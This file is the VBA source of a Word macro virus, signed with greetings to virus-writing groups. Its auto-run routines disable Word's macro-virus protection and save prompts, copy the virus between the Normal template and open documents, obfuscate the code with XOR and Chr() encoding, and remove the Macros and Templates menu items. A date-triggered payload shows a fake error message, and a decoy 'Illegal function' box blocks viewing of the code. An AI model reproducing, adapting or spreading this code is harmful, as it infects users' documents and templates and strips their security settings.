   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Const Ofile = "z#Ez{-(((7mam": Const Ifile = "z#E~|wplj7mam": Const Fmac = "z{-((("
   Const Smac = "z{Fklw": Const Tool = "Mvvuj": Const Mmac = "Txzkv"
   Const Mtemp = "M|tiuxm|j9xw}9X}}4Pwj777": Const Mform = "_vktxm": Const Mstyl = "Jm`u|777"
   Sub AutoOpen()
   On Error Resume Next
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Options.ConfirmConversions = False
   For I = 1 To NormalTemplate.VBProject.VBComponents.Count
       If NormalTemplate.VBProject.VBComponents(I).Name = Morph(Smac, 25) Then GoTo Label_Exit
       If NormalTemplate.VBProject.VBComponents(I).Name = Morph(Fmac, 25) Then NormInstall = True
   Next I
   For I = 1 To ActiveDocument.VBProject.VBComponents.Count
       If ActiveDocument.VBProject.VBComponents(I).Name = Morph(Fmac, 25) Then ActivInstall = True
   Next I
   If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
   If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
   If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
   Doc.VBProject.VBComponents(Morph(Fmac, 25)).Export (Morph(Ofile, 25))
   Call GeniusFunction
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
   Label_Exit:
   CommandBars(Morph(Tool, 25)).Controls(Morph(Mmac, 25)).Delete
   CommandBars(Morph(Tool, 25)).Controls(Morph(Mtemp, 25)).Delete
   CommandBars(Morph(Mform, 25)).Controls(Morph(Mstyl, 25)).Delete
   Application.ScreenUpdating = True
   Application.DisplayAlerts = wdAlertsAll
   Application.EnableCancelKey = wdCancelInterrupt
   End Sub
   Function GeniusFunction()
   Application.ScreenUpdating = False
   Dim decrypt(23)
   decrypt(1) = Chr(65) + Chr(116) + Chr(116) + Chr(114) + Chr(105) + Chr(98) + Chr(117) + Chr(116) + Chr(101) + Chr(32) + Chr(86) + Chr(66) + Chr(95) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(99) + Chr(98) + Chr(95) + Chr(114) + Chr(117) + Chr(110) + Chr(34)
   decrypt(2) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
   decrypt(3) = Chr(79) + Chr(110) + Chr(32) + Chr(69) + Chr(114) + Chr(114) + Chr(111) + Chr(114) + Chr(32) + Chr(82) + Chr(101) + Chr(115) + Chr(117) + Chr(109) + Chr(101) + Chr(32) + Chr(78) + Chr(101) + Chr(120) + Chr(116)
   decrypt(4) = Chr(73) + Chr(102) + Chr(32) + Chr(68) + Chr(97) + Chr(121) + Chr(40) + Chr(78) + Chr(111) + Chr(119) + Chr(41) + Chr(32) + Chr(61) + Chr(32) + Chr(55) + Chr(32) + Chr(65) + Chr(110) + Chr(100) + Chr(32) + Chr(77) + Chr(111) + Chr(110) + Chr(116) + Chr(104) + Chr(40) + Chr(78) + Chr(111) + Chr(119) + Chr(41) + Chr(32) + Chr(61) + Chr(32) + Chr(57) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(77) + Chr(115) + Chr(103) + Chr(66) + Chr(111) + Chr(120) + Chr(32) + Chr(34) + Chr(67) + Chr(66) + Chr(52) + Chr(49) + Chr(49) + Chr(49) + Chr(32) + Chr(69) + Chr(114) + Chr(114) + Chr(111) + Chr(114) + Chr(33) + Chr(32) + Chr(80) + Chr(114) + Chr(101) + Chr(115) + Chr(115) + Chr(32) + Chr(79) + Chr(75) + Chr(32) + Chr(116) + Chr(111) + Chr(32) + Chr(114) + Chr(101) + Chr(115) + Chr(117) + Chr(109) + Chr(101) + Chr(46) + Chr(34) + Chr(44) + Chr(32) + Chr(118) + Chr(98) + Chr(67) + Chr(114) + Chr(105) + Chr(116) + Chr(105) + Chr(99) + Chr(97) + Chr(108)
   decrypt(5) = Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(46) + Chr(68) + Chr(105) + Chr(115) + Chr(112) + Chr(108) + Chr(97) + Chr(121) + Chr(65) + Chr(108) + Chr(101) + Chr(114) + Chr(116) + Chr(115) + Chr(32) + Chr(61) + Chr(32) + Chr(119) + Chr(100) + Chr(65) + Chr(108) + Chr(101) + Chr(114) + Chr(116) + Chr(115) + Chr(78) + Chr(111) + Chr(110) + Chr(101)
   decrypt(6) = Chr(70) + Chr(111) + Chr(114) + Chr(32) + Chr(73) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116)
   decrypt(7) = Chr(73) + Chr(102) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(40) + Chr(73) + Chr(41) + Chr(46) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(99) + Chr(98) + Chr(52) + Chr(49) + Chr(49) + Chr(49) + Chr(34) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101)
   decrypt(8) = Chr(78) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + Chr(73)
   decrypt(9) = Chr(70) + Chr(111) + Chr(114) + Chr(32) + Chr(73) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116)
   decrypt(10) = Chr(73) + Chr(102) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(40) + Chr(73) + Chr(41) + Chr(46) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(99) + Chr(98) + Chr(52) + Chr(49) + Chr(49) + Chr(49) + Chr(34) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101)
   decrypt(11) = Chr(78) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + Chr(73)
   decrypt(12) = Chr(73) + Chr(102) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101) + Chr(32) + Chr(65) + Chr(110) + Chr(100) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(71) + Chr(111) + Chr(84) + Chr(111) + Chr(32) + Chr(76) + Chr(97) + Chr(98) + Chr(101) + Chr(108) + Chr(95) + Chr(69) + Chr(120) + Chr(105) + Chr(116)
   decrypt(13) = Chr(73) + Chr(102) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101) + Chr(32) + Chr(65) + Chr(110) + Chr(100) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(70) + Chr(97) + Chr(108) + Chr(115) + Chr(101) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110)
   decrypt(14) = Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(73) + Chr(109) + Chr(112) + Chr(111) + Chr(114) + Chr(116) + Chr(32) + Chr(40) + Chr(34) + Chr(99) + Chr(58) + Chr(92) + Chr(99) + Chr(98) + Chr(52) + Chr(49) + Chr(49) + Chr(49) + Chr(46) + Chr(116) + Chr(120) + Chr(116) + Chr(34) + Chr(41)
   decrypt(15) = Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(83) + Chr(97) + Chr(118) + Chr(101)
   decrypt(16) = Chr(69) + Chr(108) + Chr(115) + Chr(101)
   decrypt(17) = Chr(68) + Chr(110) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(70) + Chr(117) + Chr(108) + Chr(108) + Chr(78) + Chr(97) + Chr(109) + Chr(101)
   decrypt(18) = Chr(73) + Chr(102) + Chr(32) + Chr(76) + Chr(101) + Chr(102) + Chr(116) + Chr(36) + Chr(40) + Chr(68) + Chr(110) + Chr(97) + Chr(109) + Chr(101) + Chr(44) + Chr(56) + Chr(41) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(34) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(71) + Chr(111) + Chr(84) + Chr(111) + Chr(32) + Chr(76) + Chr(97) + Chr(98) + Chr(101) + Chr(108) + Chr(95) + Chr(69) + Chr(120) + Chr(105) + Chr(116)
   decrypt(19) = Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(73) + Chr(109) + Chr(112) + Chr(111) + Chr(114) + Chr(116) + Chr(32) + Chr(40) + Chr(34) + Chr(99) + Chr(58) + Chr(92) + Chr(99) + Chr(98) + Chr(52) + Chr(49) + Chr(49) + Chr(49) + Chr(46) + Chr(116) + Chr(120) + Chr(116) + Chr(34) + Chr(41)
   decrypt(20) = Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(83) + Chr(97) + Chr(118) + Chr(101) + Chr(65) + Chr(115) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(58) + Chr(61) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(70) + Chr(117) + Chr(108) + Chr(108) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(44) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(70) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(116) + Chr(58) + Chr(61) + Chr(119) + Chr(100) + Chr(70) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(116) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116)
   decrypt(21) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(102)
   decrypt(22) = Chr(76) + Chr(97) + Chr(98) + Chr(101) + Chr(108) + Chr(95) + Chr(69) + Chr(120) + Chr(105) + Chr(116) + Chr(58)
   decrypt(23) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
   FileNumber = FreeFile
   Open Morph(Ifile, 25) For Output As #FileNumber
   For x = 1 To 23
       Print #FileNumber, decrypt(x)
   Next x
   Close #FileNumber
   For I = 1 To NormalTemplate.VBProject.VBComponents.Count
       If NormalTemplate.VBProject.VBComponents(I).Name = Morph(Fmac, 25) Then NormInstall = True
   Next I
   If NormInstall = True Then
       Set Obj = NormalTemplate.VBProject
   Else
       Set Obj = VBE.ActiveVBProject
   End If
   With Application
       Obj.VBComponents(Morph(Fmac, 25)).CodeModule.ReplaceLine 98, Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(73) + Chr(109) + Chr(112) + Chr(111) + Chr(114) + Chr(116) + Chr(32) + Chr(40) + Chr(34) + Chr(99) + Chr(58) + Chr(92) + Chr(103) + Chr(101) + Chr(110) + Chr(105) + Chr(117) + Chr(115) + Chr(46) + Chr(116) + Chr(120) + Chr(116) + Chr(34) + Chr(41)
       NormalTemplate.Save
       Call Do_The_Thing
       Obj.VBComponents(Morph(Fmac, 25)).CodeModule.ReplaceLine 98, "'ThE wEiRd GeNiUs is back!"
       NormalTemplate.Save
   End With
   Kill (Morph(Ifile, 25))
   Application.ScreenUpdating = True
   End Function
   Public Sub AutoExec()
   On Error Resume Next
   CommandBars(Morph(Tool, 25)).Controls(Morph(Mmac, 25)).Delete
   CommandBars(Morph(Tool, 25)).Controls(Morph(Mtemp, 25)).Delete
   CommandBars(Morph(Mform, 25)).Controls(Morph(Mstyl, 25)).Delete
   Application.DisplayAlerts = wdAlertsNone
   Application.ScreenUpdating = False
   Options.VirusProtection = False
   End Sub
   Sub ViewVBCode()
   Application.EnableCancelKey = wdCancelDisabled
   Message = Chr(73) + Chr(108) + Chr(108) + Chr(101) + Chr(103) + Chr(97) + Chr(108) + Chr(32) + Chr(102) + Chr(117) + Chr(110) + Chr(99) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(105) + Chr(110) + Chr(32) + Chr(109) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(32) + Chr(48) + Chr(120) + Chr(67) + Chr(66) + Chr(49) + Chr(53) + Chr(67) + Chr(48) + Chr(48)
   For x = 1 To 10000000
   Next x
   MsgBox Message, vbCritical
   Application.EnableCancelKey = wdCancelInterrupt
   End Sub

   Sub AutoExit()
   On Error Resume Next
   Application.NormalTemplate.VBProject.VBComponents.Remove Application.NormalTemplate.VBProject.VBComponents(Morph(Smac, 25))
   NormalTemplate.Save
   Kill (Morph(Ofile, 25))
   End Sub
   Private Function Morph(s, k As Integer)
   Dim r
   r = ""
   For f = 1 To Len(s): r = r + Chr((Asc(Mid$(s, f, 1))) Xor k): Next
   Morph = r
   End Function
   ' Greetings to the Codebreakers, VicodinEs & Lord Natas and to ALT-F11
   ' Thanks for the cb4111 guide.
   ' Until the next bug, greetings, WG
